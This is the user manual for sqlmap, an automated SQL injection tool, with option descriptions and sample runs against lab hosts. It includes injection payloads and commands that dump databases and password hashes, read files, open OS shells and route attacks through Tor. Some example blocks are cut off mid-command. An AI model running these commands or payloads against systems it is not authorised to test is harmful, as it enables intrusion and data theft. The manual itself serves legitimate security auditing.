<sect>Introduction
<p>
sqlmap is an open source command-line automatic
<htmlurl url="http://www.google.com/search?q=SQL+injection" name="SQL injection">
tool.
Its goal is to detect and take advantage of SQL injection vulnerabilities
in web applications. Once it detects one or more SQL injections on the
target host, the user can choose among a variety of options to perform an
extensive back-end database management system fingerprint, retrieve DBMS
session user and database, enumerate users, password hashes, privileges,
databases, dump entire or user's specific DBMS tables/columns, run his own
SQL statement, read specific files on the file system and more.


<sect1>Requirements

<p>
sqlmap is developed in <htmlurl url="http://www.python.org" name="Python">,
a dynamic object-oriented interpreted programming language.
This makes the tool independent from the operating system since it only
requires the Python interpreter version equal or above to 2.4.
The interpreter is freely downloadable from its
<htmlurl url="http://python.org/download/" name="official site">.
To make it even easier, many GNU/Linux distributions come out of the box
with Python interpreter package installed and other Unices and MacOS X
too provide it packaged in their formats and ready to be installed.
Windows users can download and install the Python setup-ready installer
for x86, AMD64 and Itanium too.

Optionally, if you are running sqlmap on Windows, you may wish to install
<htmlurl url="http://ipython.scipy.org/moin/PyReadline/Intro" name="PyReadline">
library to be able to take advantage of the sqlmap TAB completion and
history support functionalities in the SQL shell and OS shell.
Note that these functionalities are available natively by Python standard
<htmlurl url="http://docs.python.org/library/readline.html" name="readline">
library on other operating systems.
You can also choose to install <htmlurl url="http://psyco.sourceforge.net/" name="Psyco">
library to speed up the sqlmap algorithmic operations.


<sect1>Scenario

<p>
Let's say that you are auditing a web application and found a web page
that accepts dynamic user-provided values on <tt>GET</tt> or <tt>POST</tt>
parameters or HTTP <tt>Cookie</tt> values or HTTP <tt>User-Agent</tt>
header value.
You now want to test if these are affected by a SQL injection
vulnerability, and if so, exploit them to retrieve as much information as
possible out of the web application's back-end database management system
or even be able to access the underlying operating system.

Consider that the target url is:

<tscreen><tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1</tt></tscreen>

Assume that:

<tscreen><tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1+AND+1=1</tt></tscreen>

is the same page as the original one and:

<tscreen><tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1+AND+1=2</tt></tscreen>

differs from the original one, it means that you are in front of a SQL
injection vulnerability in the <tt>id</tt> <tt>GET</tt> parameter of the
<tt>index.php</tt> web application page which means that no IDS/IPS, no
web application firewall, no parameters' value sanitization is performed
on the server-side.

This is a quite common flaw in dynamic content web applications and it
does not depend upon the back-end database management system nor on the web
application programming language: it is a programmer code's security flaw.
The <htmlurl url="http://www.owasp.org" name="Open Web Application Security Project">
rated on 2007 in their <htmlurl url="http://www.owasp.org/index.php/Top_10_2007"
name="OWASP Top Ten"> survey this vulnerability as the <htmlurl
url="http://www.owasp.org/index.php/Top_10_2007-A2" name="most
common"> and important web application vulnerability, second only to
<htmlurl url="http://www.owasp.org/index.php/Top_10_2007-A1"
name="Cross-Site Scripting">.

Back to the scenario, probably the SQL <tt>SELECT</tt> statemenet into
<tt>get_int.php</tt> has a syntax similar to the following SQL query, in
pseudo PHP code:

<tscreen><tt>
$query = "SELECT &#91;column(s) name&#93; FROM &#91;table name&#93; WHERE id=" . $_REQUEST['id'];
</tt></tscreen>

As you can see, appending any other syntatically valid SQL condition after
a value for <tt>id</tt> such condition will take place when the web
application passes the query to the back-end database management system
that executes it, that is why the condition <tt>id=1 AND 1=1</tt> is valid
(<em>True</em>) and returns the same page as the original one, with the
same content and without showing any SQL error message.

Moreover, in this simple and easy to inject scenario it would be also
possible to append, not just one or more valid SQL condition(s), but also
stacked SQL queries, for instance something like <tt>[...]&amp;id=1;
ANOTHER SQL QUERY#</tt> if the web application technology supports
<em>stacked queries</em>, also known as <em>multiple statements</em>.

Now that you found this SQL injection vulnerable parameter, you can
exploit it by manipulating the <tt>id</tt> parameter value in the HTTP
request.

There exist many <htmlurl url="http://delicious.com/inquis/sqlinjection" name="resources">
on the Net explaining in depth how to prevent, how to detect and how to
exploit SQL injection vulnerabilities in web application and it is
recommended to read them if you are not familiar with the issue before
going ahead with sqlmap.

Passing the original address, <tt>http://192.168.1.121/sqlmap/mysql/get_int.php?id=1</tt>
to sqlmap, the tool will automatically:

<itemize>
<item>Identify the vulnerable parameter(s) (<tt>id</tt> in this scenario);
<item>Depending on the user's options, sqlmap uses the <bf>blind SQL
injection</bf> or the <bf>inband SQL injection</bf> technique as described
in the following section to go ahead with the exploiting.
</itemize>


<sect1>Techniques

<p>
sqlmap implements three techniques to exploit a SQL injection
vulnerability:

<itemize>
<item><bf>Inferential Blind SQL injection</bf>: sqlmap appends to the
affected parameter in the HTTP request, a syntatically valid SQL statement
string containing a <tt>SELECT</tt> sub-statement, or any other SQL
statement whose the user want to retrieve the output.
For each HTTP response, by making a comparison based upon HTML page
content hashes, or string matches, with the original request, the tool
determines the output value of the statement character by character.
The bisection algorithm implemented in sqlmap to perform this technique
is able to fetch each output character with at maximum seven HTTP
requests.
This is sqlmap default SQL injection technique.
<item><bf>UNION query (inband) SQL injection</bf>, also known as <bf>Full
UNION query SQL injection</bf>: sqlmap appends to the affected parameter
in the HTTP request, a syntatically valid SQL statement string starting
with a <tt>UNION ALL SELECT</tt>. This techique is useful if the web
application page passes the output of the <tt>SELECT</tt> statement to a
<tt>for</tt> cycle, or similar, so that each line of the query output is
printed on the page content.
sqlmap is also able to exploit <bf>Partial UNION query SQL injection</bf>
vulnerabilities which occur when the output of the statement is not cycled
in a for construct whereas only the first entry output is displayed.
This technique is much faster if the target url is affected by because
in a single HTTP response it returns the whole query output or a entry
per each response within the page content.
This SQL injection technique is an alternative to the first one.
<item><bf>Stacked queries support</bf>, also known as <bf>multiple
statements support</bf>: sqlmap tests if the web application supports
stacked queries then, in case it does support, it appends to the affected
parameter in the HTTP request, a semi-colon (<tt>;</tt>) followed by the
SQL statement to be executed. This technique is useful to run SQL
statements other than <tt>SELECT</tt> like, for instance, <em>data
definition</em> or <em>data manipulation</em> statements possibly leading
to file system read and write access and operating system command
execution depending on the underlying back-end database management system
and the session user privileges.
</itemize>


<sect>Features

<p>
Major features implemented in sqlmap include:

<itemize>
<item>Full support for <bf>MySQL</bf>, <bf>Oracle</bf>, <bf>PostgreSQL</bf>
and <bf>Microsoft SQL Server</bf> back-end database management systems.
Besides these four database management systems software. sqlmap can also
identify Microsoft Access, DB2, Informix, Sybase and Interbase.

<item>Full support for three SQL injection techniques: <bf> inferential
blind SQL injection</bf>, <bf>UNION query (inband) SQL injection</bf> and
<bf>stacked queries (multiple statements) support</bf>. sqlmap can also
test for <bf>time based blind SQL injection</bf>.

<item><bf>Extensive back-end database management system fingerprint</bf>
based upon
<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="inband error messages">,
<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="banner parsing">,
<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="functions output comparison"> and
<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="specific features">
such as MySQL comment injection. It is also possible to force the back-end
database management system name if you already know it. sqlmap is also able
to fingerprint the web server operating system, the web application
technology and, in some circumstances, the back-end DBMS operating system.

<item>Options to retrieve on all four back-end database management system
<bf>banner</bf>, <bf>current user</bf>, <bf>current database</bf>,
enumerate <bf>users</bf>, <bf>users password hashes</bf>, <bf>users
privileges</bf>, <bf>databases</bf>, <bf>tables</bf>, <bf>columns</bf>,
dump <bf>tables entries</bf>, dump <bf>whole database management
system</bf> and run your <bf>own SQL statement</bf>.

<item>If the back-end database management system is MySQL it is also
possible to <bf>read a specific file content</bf> from the ile system and,
in some circumstances, <bf>prompt for an interactive operating system
shell</bf> with TAB completion and history support.

<item>It is possible to provide a single target URL, get the list of
targets from <htmlurl url="http://portswigger.net/suite/" name="Burp proxy">
requests log file path or
<htmlurl url="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project" name="WebScarab proxy">
<tt>conversations/</tt> folder path or get the list of targets by providing
sqlmap with a Google dork which queries
<htmlurl url="http://www.google.com" name="Google"> search engine and
parses its results page.

<item>Automatically tests all provided <bf>GET</bf> parameters,
<bf>POST</bf> parameters, HTTP <bf>Cookie</bf> header values and HTTP
<bf>User-Agent</bf> header value to find the dynamic ones, which means
those that vary the HTTP response page content.
On the dynamic ones sqlmap automatically tests and detects the ones
affected by SQL injection. Each dynamic parameter is tested for
<em>numeric</em>, <em>single quoted string</em>, <em>double quoted
string</em> and all of these three datatypes with zero to two parenthesis
to correctly detect which is the <tt>SELECT</tt> statement syntax to
perform further injections with. It is also possible to specify the
parameter(s) that you want to perform tests and use for injection on.

<item>Option to specify the <bf>maximum number of concurrent HTTP
requests</bf> to speed up the blind SQL injection algorithms
(multithreading). It is also possible to specify the number of seconds to
wait between each HTTP request.

<item><bf>HTTP <tt>Cookie</tt> header</bf> string support, useful when the
web application requires authentication based upon cookies and you have
such data or in case you just want to test for and exploit SQL injection
on such header.

<item>Automatically handle <bf>HTTP <tt>Set-Cookie</tt> header</bf> from
target url, re-establishing of the session if it expires. Test and exploit
on these values is supported too.

<item><bf>HTTP Basic and Digest authentications</bf> support.

<item><bf>Anonymous HTTP proxy</bf> support to pass by the requests to the
target URL that works also with HTTPS requests.

<item>Options to fake the <bf>HTTP <tt>Referer</tt> header</bf> value and
the <bf>HTTP <tt>User-Agent</tt> header</bf> value specified by user or
randomly selected from a text file.

<item>Support to increase the <bf>verbosity level of output messages</bf>:
there exist <bf>six levels</bf>. The default level is <bf>1</bf> in which
information, warnings, errors and tracebacks, if they occur, will be shown.

<item>Granularity in the user's options.

<item><bf>Estimated time of arrival</bf> support for each query, updated
in real time while fetching the information to give to the user an
overview on how long it will take to retrieve the output.

<item>Support to save the session (queries and their output, even if
partially retrieved) in real time while fetching the data on a text file
and <bf>resume the injection from this file in a second time</bf>.

<item>Support to read options from a configuration INI file rather than
specify each time all of the options on the command line. Support also to
save command line options on a configuration INI file.

<item>Integration with other IT security related open source projects,
<htmlurl url="http://metasploit.com/framework/" name="Metasploit"> and <htmlurl
url="http://w3af.sourceforge.net/" name="w3af">.

<item><bf>File system</bf> read and write access and <bf>operating
system</bf> command execution by providing own queries, depending on the
session user privileges and back-end DBMS.

<item><bf>PHP setting <tt>magic_quotes_gpc</tt> bypass</bf> by encoding
every query string, between single quotes, with <tt>CHAR</tt>, or similar,
database management system function.

<p>
Option: <tt>-v</tt>

<p>
Verbose options can be used to set the verbosity level of output messages.
There exist six levels.
The default level is <bf>1</bf> in which information, warnings, errors and
tracebacks, if they occur, will be shown.
Level <bf>2</bf> shows also debug messages, level <bf>3</bf> shows also
HTTP requests with all HTTP headers sent, level <bf>4</bf> shows also HTTP
responses headers and level <bf>5</bf> shows also HTTP responses page
content.

<sect2>Process Google dork results as target urls

<p>
Option: <tt>-g</tt>

<p>
It is also possible to test and inject on <tt>GET</tt> parameters on the
results of your Google dork.

<p>
This option makes sqlmap negotiate with the search engine its session
cookie to be able to perform a search, then sqlmap will retrieve Google
first 100 results for the Google dork expression with <tt>GET</tt> parameters
asking you if you want to test and inject on each possible affected URL.

<sect2>Load options from a configuration INI file

<p>
Option: <tt>-c</tt>

<p>
It is possible to pass user's options from a configuration INI file, an
example is <tt>sqlmap.conf</tt>.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -c "sqlmap.conf"

[hh:mm:42] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
[hh:mm:42] [WARNING] GET parameter 'cat' is not dynamic
back-end DBMS:  MySQL >= 5.0.0
</verb></tscreen>

<p>
Note that if you also provide other options from command line, those are
evaluated when running sqlmap and overwrite the same options, if set, in
the provided configuration file.


<sect1>Request

<p>
These options can be used to specify how to connect to the target url.

<sect2>HTTP method: <tt>GET</tt> or <tt>POST</tt>

<p>
Options: <tt>--method</tt> and <tt>--data</tt>

<p>
By default the HTTP method used to perform HTTP requests is <tt>GET</tt>,
but you can change it to <tt>POST</tt> and provide the data to be sent
through <tt>POST</tt> request. Such data, being those parameters, are
tested for SQL injection like the <tt>GET</tt> parameters.

<sect2>HTTP <tt>Cookie</tt> header

<p>
Option: <tt>--cookie</tt>

<p>
This feature can be useful in two scenarios:

<itemize>
<item>The web application requires authentication based upon cookies and
you have such data.
<item>You want to test for and exploit SQL injection on such header
values.
</itemize>

<p>
The steps to go through in the second scenario are the following:

<itemize>
<item>On Firefox web browser login on the web authentication form while
dumping URL requests with <htmlurl url="http://tamperdata.mozdev.org/"
name="TamperData"> browser's extension.
<item>In the horizontal box of the extension select your authentication
transaction then in the left box on the bottom click with the right button
on the <tt>Cookie</tt> value, then click on <tt>Copy</tt> to save its
value to the clipboard.
<item>Go back to your shell and run sqlmap.
</itemize>

<p>
Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/cookie_int.php" --cookie \
  "id=1" -v 1

[...]
</verb></tscreen>

<p>
Note that the HTTP <tt>Cookie</tt> header values are separated by a
<tt>;</tt> character, <bf>not</bf> by an <tt>&amp;</tt>.

<p>
If the web application at first HTTP response has within the HTTP headers
a <tt>Set-Cookie</tt> header, sqlmap will automatically use it in all HTTP
requests as the HTTP <tt>Cookie</tt> header and also test for SQL
injection on these values.

<p>
Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:

<p>
If you provide an HTTP <tt>Cookie</tt> header value and the target URL
sends an HTTP <tt>Set-Cookie</tt> header, sqlmap asks you which one to use
in the following HTTP requests.

<p>
Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.125/sqlmap/get_str.asp?name=luther" --cookie "id=1"

<sect2>HTTP <tt>Referer</tt> header

<p>
Option: <tt>--referer</tt>

<p>
It is possible to fake the HTTP <tt>Referer</tt> header value with this

<p>
Note that the HTTP <tt>User-Agent</tt> header is tested against SQL
injection also if you do not overwrite the default sqlmap HTTP
<tt>User-Agent</tt> header value.

<p>
Some sites perform a server-side check on the HTTP <tt>User-Agent</tt>
header value and fail the HTTP response if a valid <tt>User-Agent</tt> is
not provided, its value is not expected or its value is blocked by a web
application firewall or similar intrusion prevention system. In this case
sqlmap will show you a message as follows:

<tscreen><verb>
[hh:mm:20] [ERROR] the target url responded with an unknown HTTP status code, try
to force the HTTP User-Agent header with option --user-agent or -a
</verb></tscreen>


<sect2>Extra HTTP headers

<p>
Option: <tt>--headers</tt>

<p>
It is possible to provide extra HTTP headers by providing <tt>--headers</tt>
options. Each header must be separated by a "\n" string and it's much easier
to provide them from the configuration INI file. Have a look at the sample
<tt>sqlmap.conf</tt> file.


<sect2>HTTP <tt>Basic</tt> and <tt>Digest</tt> authentications

<p>
Options: <tt>--auth-type</tt> and <tt>--auth-cred</tt>

<p>
These options can be used to specify which HTTP authentication type the
web server implements and the valid credentials to be used to perfom all
HTTP requests to the target URL.
The two valid types are <tt>Basic</tt> and <tt>Digest</tt> and the
credentials' syntax is <tt>username:password</tt>.

<p>
Examples on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>

<sect2>HTTP proxy

<p>
Option: <tt>--proxy</tt>

<p>
It is possible to provide an anonymous HTTP proxy address to pass by the
HTTP requests to the target URL. The syntax of HTTP proxy value is
<tt>http://url:port</tt>.

<p>
Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
  --proxy "http://192.168.1.47:3128"

[hh:mm:36] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
[hh:mm:36] [WARNING] GET parameter 'cat' is not dynamic
[hh:mm:37] [WARNING] the back-end DMBS is not MySQL
[hh:mm:37] [WARNING] the back-end DMBS is not Oracle
back-end DBMS:    PostgreSQL
</verb></tscreen>

<p>
Instead of using a single anonymous HTTP proxy server to pass by, you can
configure a <htmlurl url="http://tor.eff.org" name="Tor client"> together
with <htmlurl url="http://www.privoxy.org" name="Privoxy"> on your machine
as explained on the <htmlurl url="http://tor.eff.org/docs/tor-doc-unix.html.en"
name="Tor client guide"> then run sqlmap as follows:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \
  --proxy "http://192.168.1.47:8118"
</verb></tscreen>

<p>
Note that <tt>8118</tt> is the default Privoxy port, adapt it to your
settings.


<sect2>Concurrent HTTP requests

<p>
Option: <tt>--threads</tt>

<p>
It is possible to specify the number of maximum concurrent HTTP requests
that sqlmap can start when it uses the blind SQL injection technique to
retrieve the query output.
This feature relies on the <htmlurl url="http://en.wikipedia.org/wiki/Multithreading"
name="multithreading"> concept and inherits both its pro and its cons.

<p>
Examples on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 \
  --current-user --threads 3

[...]
web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0.0

[hh:mm:18] [INFO] fetching current user
[hh:mm:18] [INFO] retrieving the length of query output
[hh:mm:18] [INFO] query: IFNULL(CAST(LENGTH(CURRENT_USER()) AS CHAR(10000)), CHAR(32))
[hh:mm:18] [INFO] retrieved: 18
[hh:mm:19] [INFO] query: IFNULL(CAST(CURRENT_USER() AS CHAR(10000)), CHAR(32))
[hh:mm:19] [INFO] starting 3 threads
[hh:mm:19] [INFO] retrieved: testuser@localhost
[hh:mm:19] [INFO] performed 126 queries in 0 seconds
current user:    'testuser@localhost'
</verb></tscreen>

<p>
As you can see, sqlmap first calculates the length of the query output,
then starts three threads. Each thread is assigned to retrieve one
character of the query output. The thread then ends after up to seven
HTTP requests, the maximum requests to retrieve a query output character
with the blind SQL injection bisection algorithm implemented in sqlmap.

<p>
Note that the multithreading option is not needed if the target is affected
by an inband SQL injection vulnerability and the <tt>--union-use</tt>
option has been provided.


<sect2>Delay in seconds between each HTTP request

<p>
Option: <tt>--delay</tt>

<p>
It is possible to specify a number of seconds to wait between each HTTP
request. The valid value is a float, for instance 0.5 means half a second.


<sect2>Seconds to wait before timeout connection

<p>
Option: <tt>--timeout</tt>

<p>
It is possible to specify a number of seconds to wait before considering
the HTTP request timed out. The valid value is a float, for instance
10.5 means ten seconds and a half.


<sect1>Injection

<p>
These options can be used to specify which parameters to test for, provide
custom injection payloads and how to parse and compare HTTP responses page
content when using the blind SQL injection technique.

<sect2>Testable parameter(s)

<p>
Option: <tt>-p</tt>

<p>
By default sqlmap tests all <tt>GET</tt> parameters, <tt>POST</tt>
parameters, HTTP <tt>Cookie</tt> header values and HTTP <tt>User-Agent</tt>
header value for dynamicity and SQL injection vulnerability, but it is
possible to manually specificy the parameter(s) you want sqlmap to perform
tests on comma separeted in order to skip dynamicity tests and perform SQL
injection test and inject directly only against the provided parameter(s).

Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 \
  -p "id"

[hh:mm:49] [INFO] testing for parenthesis on injectable parameter
[hh:mm:49] [INFO] the injectable parameter requires 0 parenthesis
[...]
</verb></tscreen>

<p>
Or, if you want to provide more than one parameter, for instance:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;cat=2" -v 1 \
  -p "cat,id"
</verb></tscreen>

<p>
You can also test only the HTTP <tt>User-Agent</tt> header.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 \

<sect2>Force the database management system name

<p>
Option: <tt>--dbms</tt>

<p>
By default sqlmap automatically detects the web application's back-end
database manangement system.
At the moment the fully supported database management system are four:

<itemize>
<item>MySQL
<item>Oracle
<item>PostgreSQL
<item>Microsoft SQL Server
</itemize>

<p>
It is possible to force the name if you already know it so that sqlmap
will skip the fingerprint with an exception for MySQL to only identify if
it is MySQL &lt; 5.0 or MySQL &gt;= 5.0.
To avoid also this check you can provide instead <tt>MySQL 4</tt> or
<tt>MySQL 5</tt>.

Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 2 \
  --dbms "PostgreSQL"

[...]

web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS:    PostgreSQL
</verb></tscreen>

<p>
In case you provide <tt>--fingerprint</tt> together with <tt>--dbms</tt>,
sqlmap will only perform the extensive fingerprint for the specified
database management system, read below for further details.

<p>
Note that this option is <bf>not</bf> mandatory and it is strongly
recommended to use it <bf>only if you are absolutely sure</bf> about the
back-end database management system. If you do not know it, let sqlmap
automatically identify it for you.


<sect2>Custom injection payload

<p>
Options: <tt>--prefix</tt> and <tt>--postfix</tt>

<p>
In some circumstances the vulnerable parameter is exploitable only if the
user provides a postfix to be appended to the injection payload.
Another scenario where these options come handy presents itself when the
user already knows that query syntax and want to detect and exploit the
SQL injection by directly providing a injection payload prefix and/or
postfix.

<p>
Example on a <bf>MySQL 5.0.67</bf> target on a page where the SQL query is:
<tt>$query = "SELECT * FROM users WHERE id=('" . $_GET['id'] . "') LIMIT 0, 1";</tt>:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_str_brackets.php?id=1" -v 3 \
  -p "id" --prefix "'" --postfix "AND 'test'='test"

[...]
[hh:mm:16] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
[hh:mm:16] [INFO] testing custom injection on GET parameter 'id'
[hh:mm:16] [TRAFFIC OUT] HTTP request:
GET /sqlmap/mysql/get_str_brackets.php?id=1%27%29%20AND%207433=7433%20AND%20

[...]
[hh:mm:17] [INFO] GET parameter 'id' is custom injectable 
[...]
</verb></tscreen>

<p>
As you can see, the injection payload for testing for custom injection is:

<tscreen><verb>
id=1%27%29%20AND%207433=7433%20AND%20%28%27test%27=%27test
</verb></tscreen>

which URL decoded is:

<tscreen><verb>
id=1') AND 7433=7433 AND ('test'='test
</verb></tscreen>

and makes the query syntatically correct to the page query:

<tscreen><verb>
SELECT * FROM users WHERE id=('1') AND 7433=7433 AND ('test'='test') LIMIT 0, 1
</verb></tscreen>

<p>
In this simple example, sqlmap could detect the SQL injection and exploit
it without need to provide a custom injection payload, but sometimes in
the real world application it is necessary to provide it.


<sect2>Page comparison

<p>
Options: <tt>--string</tt> and <tt>--regexp</tt>

<p>
By default the distinction of a True query by a False one (basic concept
for Inferential Blind SQL injection attacks) is done comparing injected
requests page content MD5 hash with the original not injected page content
MD5 hash.
Not always this concept works because sometimes the page content changes at
each refresh even not injecting anything, for instance when the page has a
counter, a dynamic advertisment banner or any other part of the HTML which
is render dynamically and might change in time not only consequently to
user's input.
To bypass this limit, sqlmap makes it possible to manually provide a
string which is <bf>always</bf> present on the not injected page
<bf>and</bf> on all True injected query pages, but that it is <bf>not</bf>
on the False ones. This can also be achieved by providing a regular
expression.
Such information is easy for an user to retrieve, simply try to inject on
the affected URL parameter an invalid value and compare original (not
injected) page content with the injected wrong page content to identify
which string or regular expression match is on not injected and True page
only.
This way the distinction will be based upon string presence or regular
expression match and not page MD5 hash comparison.

Example on a <bf>MySQL 5.0.67</bf> target on a page which content changes
every second due to a call to PHP function <tt>time()</tt>:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=1" \

<p>
As you can see, the string after <tt>Dynamic content</tt> changes its
value every second. In the example it is just a call to PHP
<tt>time()</tt> function, but on the real world it is usually much more
than that.

<p>
Looking at the HTTP responses page content you can see that the first five
lines of code do not change at all.
So choosing for instance the word <tt>luther</tt> as an output that is
on the not injected page content and it is not on the False page content
(because the query condition returns no output so <tt>luther</tt> is not
displayed on the page content) and passing it to sqlmap, you are able to
inject anyway.

Example on a <bf>MySQL 5.0.67</bf> target on a page which content changes

As you can see, when one of these options is specified, sqlmap skips the
URL stability test.

<p>
<bf>Consider one of these options a must when you are dealing with a page
which content that changes itself at each refresh without modifying the
user's input</bf>.


<sect2>Exclude specific page content

<p>
Options: <tt>--excl-str</tt> and <tt>--excl-reg</tt>

<p>
Another way to get around the dynamicity issue above explained is to exclude
the dynamic part from the page content before processing it.

<p>
As you see in the above example the number after <tt>Dynamic content: </tt>
was dynamic and changed each second. To get around of this problem we could
use the above explained page comparison options or exclude this snippet of
dynamic text from the page before processing it and comparing it with the
not injected page.

<sect1>Techniques

<sect2>Test for stacked queries (multiple statements) support

<p>
Option: <tt>--stacked-test</tt>

<p>
It is possible to test if the web application technology supports
<bf>stacked queries</bf>, multiple statements, on the injectable
parameter.

<p>
Example on a <bf>MySQL 5.0.67</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" \
  --stacked-test -v 1

[...]
back-end DBMS: MySQL >= 5.0.0

[hh:mm:15] [INFO] testing stacked queries support on parameter 'id'
[hh:mm:15] [WARNING] the web application does not support stacked queries on parameter 'id'

</verb></tscreen>

<p>
By default PHP builtin function <tt>mysql_query()</tt> does not support
multiple statements.
Multiple statements is a feature supported by default only by some
web application technologies in relation to the back-end database
management system. For instance, as you can see from the next example,
where PHP does not support them on MySQL, it does on PostgreSQL.

<p>
Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" \

<p>
Option: <tt>--time-test</tt>

<p>
It is possible to test if the target URL is affected by a <bf>Time based

<sect2>Test for UNION query SQL injection

<p>
Options: <tt>--union-test</tt> and <tt>--union-tech</tt>

<p>
It is possible to test if the target URL is affected by an <bf>inband
SQL injection</bf> vulnerability.
Refer to the <em>Techniques</em> section for details on this SQL injection
technique.

<p>
Example on an <bf>Oracle XE 10.2.0.1</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" \
  --union-test -v 1

[...]
back-end DBMS:  Oracle

</verb></tscreen>

<p>
Example on a <bf>PostgreSQL 8.3.5</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_str.php?id=1" \
  --union-test -v 1

[...]
web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL

[hh:mm:29] [INFO] testing inband sql injection on parameter 'id'
[hh:mm:29] [INFO] the target url could be affected by an inband sql injection vulnerability

NULL, NULL-- AND 'iBEMR'='iBEMR'
</verb></tscreen>

<p>
As you can see, the target URL parameter <tt>id</tt> might be also
affected by an inband SQL injection.
In case this vulnerability is exploitable it is strongly recommended to
use this technique which saves a lot of time.

<p>
It is strongly recommended to run at least once sqlmap with the
<tt>--union-test</tt> option to test if the affected parameter is used
within a <tt>for</tt> cycle, or similar, and in case use
<tt>--union-use</tt> option to exploit this vulnerability because it
saves a lot of time and it does not weight down the web server log file
with hundreds of HTTP requests.


<sect2>Use the UNION query SQL injection

<p>
Option: <tt>--union-use</tt>

<p>
Providing the <tt>--union-use</tt> parameter, sqlmap will first test if
the target URL is affected by an <bf>inband SQL injection</bf>
(<tt>--union-test</tt>) vulnerability then, in case it seems to be
vulnerable, it will confirm that the parameter is affected by a <bf>Full
UNION query SQL injection</bf> and use this technique to go ahead with the
exploiting.
If the confirmation fails, it will check if the parameter is affected by
a <bf>Partial UNION query SQL injection</bf>, then use it to go ahead if it
is vulnerable.
In case the inband SQL injection vulnerability is not exploitable, sqlmap
will automatically fallback on the blind SQL injection technique to go
ahead.

<p>
Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:

<tscreen><verb>

<p>
As you can see, sqlmap identified that the parameter is affected by a
partial inband SQL injection, consequently counted the number of query
output entries and retrieved once per time by forcing the parameter
(<tt>id</tt>) value <tt>1</tt> to its negative value <tt>-1</tt> so that
it does not returns, presumibly, any output leaving our own <tt>UNION ALL
SELECT</tt> statement to produce one entry at a time and display it in the
page content.


<sect1>Fingerprint

<sect2>Extensive database management system fingerprint

<p>
Options: <tt>-f</tt> or <tt>--fingerprint</tt>

<p>
By default the web application's back-end database management system
fingerprint is performed requesting a database specific function which
returns a known static value. By comparing this value with the returned
value it is possible to identify if the back-end database is effectively
the one that sqlmap expected.

After identifying an injectable vector, sqlmap fingerprints the back-end
database management system and go ahead with the injection with their
specific syntax within the limits of the database architecture.

<p>
As you can see, from the Microsoft SQL Server banner, sqlmap was able to
correctly identify the database management system patch level.
The Microsoft SQL Server XML versions file is the result of a sqlmap
parsing library that fetches data from Chip Andrews'
<htmlurl url="http://www.sqlsecurity.com/FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx"
name="SQLSecurity.com site"> and outputs it to the XML versions file.


<sect1>Enumeration

<sect2>Banner

<p>
Option: <tt>-b</tt> or <tt>--banner</tt>

<p>
Most of the modern database management systems have a function or an
environment variable which returns details on the database managemet
system version. Sometimes also the operating system where the daemon has
been compiled on, the operating system architecture, its service pack.
Usually this function is <tt>version()</tt> or the <tt>@@version</tt>
environment variable.

<sect2>Current user

<p>
Option: <tt>--current-user</tt>

<p>
It is possible to retrieve the database management system's user which is
effectively performing the query on the database from the web application.

<sect2>Current database

<p>
Option: <tt>--current-db</tt>

<p>
It is possible to retrieve the database management system's database the
web application is connected to.

<p>
Example on a <bf>Microsoft SQL Server 2000 Service Pack 0</bf> target:

<tscreen><verb>
$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" --current-db -v 0

current database:    'master'
